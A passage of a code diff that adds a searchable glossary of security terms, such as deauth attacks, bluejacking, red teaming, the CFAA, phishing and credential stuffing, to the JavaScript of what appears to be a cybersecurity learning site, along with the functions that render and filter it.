Attack", "wireless", "Forcing clients offline to capture handshakes or disrupt service."], ["Bluejacking", "wireless", "Sending unsolicited messages to nearby Bluetooth devices."], ["Red Team", "redteam", "Offensive team simulating real adversaries to test defenses."], ["Blue Team", "blueteam", "Defensive team detecting and responding to attacks."], ["Purple Team", "redteam", "Red and blue teams collaborating to improve security together."], ["TTP", "redteam", "Tactics, Techniques, and Procedures — how an adversary operates."], ["MITRE ATT&CK", "redteam", "Knowledge base of adversary tactics and techniques."], ["Pentest", "ethicalhack", "Penetration test — authorized simulated attack to find weaknesses."], ["Bug Bounty", "bugbounty", "Vendor program paying researchers for reported vulnerabilities."], ["Responsible Disclosure", "legal", "Privately reporting flaws and allowing time to fix before public release."], ["CFAA", "legal", "US Computer Fraud and Abuse Act — criminalizes unauthorized access."], ["MFA", "ossecurity", "Multi-Factor Authentication — requires two+ proofs of identity."], ["Phishing", "foundations", "Social engineering via fake messages to steal credentials or install malware."], ["Social Engineering", "foundations", "Manipulating people to divulge secrets or perform actions."], ["MITM", "networking", "Man-in-the-Middle — attacker relays/alters traffic between two parties."], ["DDoS", "networking", "Distributed Denial of Service — overwhelming a service with traffic."], ["Brute Force", "tools", "Trying many passwords/keys until one succeeds."], ["Credential Stuffing", "tools", "Reusing leaked username/password pairs across sites."]];
+
+function renderGlossary(){
+  var list=document.getElementById('glossList');
+  if(!list)return;
+  var input=document.getElementById('glossSearch');
+  var count=document.getElementById('glossCount');
+  var q=(input?input.value.toLowerCase().trim():'');
+  var matched=GLOSSARY.filter(function(g){
+    return !q||g[0].toLowerCase().indexOf(q)>=0||g[2].toLowerCase().indexOf(q)>=0||g[1].toLowerCase().indexOf(q)>=0;
+  });
+  if(count)count.textContent=matched.length+' of '+GLOSSARY.length+' terms';
+  list.innerHTML=matched.map(function(g){
+    var sec=SEC.filter(function(s){return s.s===g[1]})[0];
+    var secName=sec?sec.t.replace(/^\d+\.\s*/,''):g[1];
+    return '<div class="gloss-item"><span class="g-term">'+g[0]+'</span><span class="g-tag">'+g[1]+'</span><div class="g-def">'+g[2]+'</div><span class="g-sec" onclick="window.S(\''+g[1]+'\')">&#8594; '+secName+'</span></div>';
+  }).join('')||'<div class="gloss-empty">No terms match your search.</div>';
+}
+function initGlossary(){
+  var input=document.getElementById('glossSearch');
+  if(input)input.addEventListener('input',renderGlossary);
+  renderGlossary();
+}
+window.renderGlossary=renderGlossary;
+buildNav();initSearch();initNav();initCollapsibles();initCopyButtons();initQuizzes();initTerminal();initHomeCards();initExercises();initBoot();initBottomNav();initReadingTime();initGlossary();initSync();
 migrateLegacyXp();updateXpBadge();
 // Progress module
 var RANKS=[
@@ -4257,11 +5697,12 @@ nav(cur);update();
   if(t.id==='termClose'||t.closest('#termClose')){e.preventDefault();if(window._closeTerminal)window._closeTerminal();return}
   if(t.id==='termMin'||t.closest('#termMin')){e.preventDefault();if(window._toggleTermMinimize)window._toggleTermMinimize();return}
 },{passive:false});
-window._toast=toast;
 })();
 
+
+
 function initSync(){
-  window._toast=toast;
+  var toast=window._toast;
   var panel=document.getElementById('syncPanel');
   var status=document.getElementById('syncStatus');
   var linkEl=document.getElementById('syncLink');
